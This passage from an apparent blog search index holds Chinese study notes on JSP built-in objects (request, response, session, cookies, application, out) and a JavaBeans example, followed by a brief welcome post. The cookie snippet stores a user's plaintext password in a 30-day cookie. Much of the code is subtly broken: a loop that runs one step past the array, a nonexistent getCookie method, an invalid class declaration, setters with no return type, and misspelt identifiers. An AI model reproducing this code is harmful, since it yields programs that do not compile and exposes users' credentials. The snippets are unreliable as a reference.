names = request.getParameterValue(&quot;names&quot;);&gt;）request.getHeaderNames() 获取http请求头的信息request.setAttribute(key.object) 设置请求对象的属性request.getAttribute(key) 获取请求对象的属性request.setCharacterEncoding(&quot;UTF-8&quot;) 对请求数据重新编码（解决post中文乱码问题，get不行）request.getContentType() 获取请求体的MIME类型request.getProtocol() 获取协议类型和版本类型request.getServerName() 获取服务器主机名request.getServerPort() 获取服务器端口号request.getContentLength() 获取请求文件的长度request.getRemoteAddr() 获取请求体的IP地址（xff不能伪装）request.getRealPath(&quot;request.jsp&quot;) 获取请求文件的绝对路径request.getContextPath() 获取请求的上下文路径 response对象封装了JSP响应，将响应发送回客户端 javax.servlet.http.HttpServletResponse类的实例1234response.setContentType(&quot;text/plain;charset=utf-8&quot;) 设置响应的MIME类型request.getRequestDispatcher(&quot;request.jsp&quot;).forward(request, response) 请求转发response.sendRedirect(&quot;xx.jsp&quot;) 页面跳转，与之前的forward不同，这个是跳转response.setCharaterEncoding(&quot;gbk&quot;) 设置响应的编码 session对象表示一个会话，用来保存用户的信息，以便跟踪用户，存在服务端，直到关闭网站或者注销账户，可以在浏览器浏览器之间切换，共享数据作用域：session javax.servlet.http.HttpSession类的实例1234567session.getid() 获取session的id号，该id号由tomcat自动分配session.isnew() 判断session是否是新建的session.setAttribute(key.object) 往当前会话中设置属性session.getAttribute(key) 从当前会话中得到属性session.removeAttribute(key) 从当前会话中删除一个属性session.setMaxInactiveInterval(1000*60*30) 设置当前会话的失效时间，tomcat默认30分钟session.invalidate() 初始化一个会话，删除会话 cookie对象cookie对象不是jsp的内置对象，需要构造，不过因为跟session很相似，就放在这边说了。123456789101112131415161718Cookie[] cookies = request.getCookie();String getName() 返回cookie的名字String getValue() 返回cookie的值接受CookieCookie[] cookies = request.getCookie();for (int i = 0; i &lt;= cookies.length; i++)&#123; if (&quot;username&quot;.equals(cookies[i].getName())) username = cookies[i].getValue(); if (&quot;password&quot;.equals(cookies[i].getName())) password = cookies[i].getValue();&#125;创建CookieCookie nameCookie = new Cookie(&quot;username&quot;, name);nameCookie.setMaxAge(60*60*24*30); 设置cookie生存周期Cookie pwdCookie = new Cookie(&quot;password&quot;, pwd);pwdCookie.setMaxAge(60*60*24*30);response.addCookie(nameCookie); 添加cookieresponse.addCookie(pwdCookie); application对象用户间数据的共享，全局变量 javax.servlet.ServletContext类的实例，代表着整个jsp页面123456789101112131415161718application.setAttribute(key.object) application.getAttribute(key)application.removeAttribute(key)实例：&lt;%application.setAttribute(&quot;city&quot;, &quot;北京&quot;);application.setAttribute(&quot;postcode&quot;, &quot;10000&quot;);application.setAttribute(&quot;email&quot;, &quot;123@123.com&quot;);%&gt;所在城市：&lt;%= application.getAttribute(&quot;city&quot;)%&gt;&lt;br /&gt;application的属性有：&lt;%Enumeration attributes = applicaiton.getAttributeNames();while(attribute.hasMoreElements()) out.println(attributes.nextElement()+&quot;&amp;nbsp;&amp;nbsp;&quot;);%&gt;&lt;br /&gt;JSP(SERVLET)引擎名以及版本号:&lt;%= application.getServerInfo()%&gt; config对象 javax.servlet.ServletConfig类的实例，这个对象允许开发者访问Servlet或者JSP引擎的初始化参数，比如文件路径等。 page对象 这个对象就是页面实例的引用。它可以被看做是整个JSP页面的代表。page 对象就是this对象的同义词。 page context对象 exception对象 out对象 javax.servlet.jsp.JspWriter 类的实例，用来在response对象中写入内容。作用域：page，也就是说每个page都有一个out对象1234out.print() 输出out.println() 输出后换行out.flush() 刷新输出流out.write() 输出 0x03 javabeansjavabeans就是符合某种特性的java类，减少代码重复 创建javabeans实例放到src的com.po包中：1234567891011121314151617181920212223package com.po;/** * 用户类**/public class Users()&#123; private String username; Private String password; //保留次构造方法 public User()&#123; &#125; public String getUsername()&#123; return username; &#125; public setUsername(String username)&#123; this.username = username; &#125; public String getPassword()&#123; return password; &#125; public setPassword(password)&#123; this.password = password; &#125;&#125; 使用javabeans实例12345678&lt;%@page import=&quot;com.po.Users&quot;%&gt;&lt;%Users user = new Users();user.setUsername(&quot;admin&quot;);user.setPassword(&quot;123456&quot;);%&gt;用户名：&lt;%= user.getUsername()%&gt;密码：&lt;%= user.getPassword()%&gt;]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>Jsp</tag>
        <tag>Java Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello]]></title>
    <url>%2F2018%2F05%2F30%2F1%2F</url>
    <content type="text"><![CDATA[Hello, This is my new blog - Pin0&apos;s Blog 之前一直在简书里写文章的，链接在这里 现在会逐步把简书的文章搬到我的博客里，各位看官要是看的不爽的，可以先收藏哦～]]></content>
      <categories>
        <category>Hello</category>
      </categories>
      <tags>
        <tag>Hello</tag>
      </tags>
  </entry>
</search>
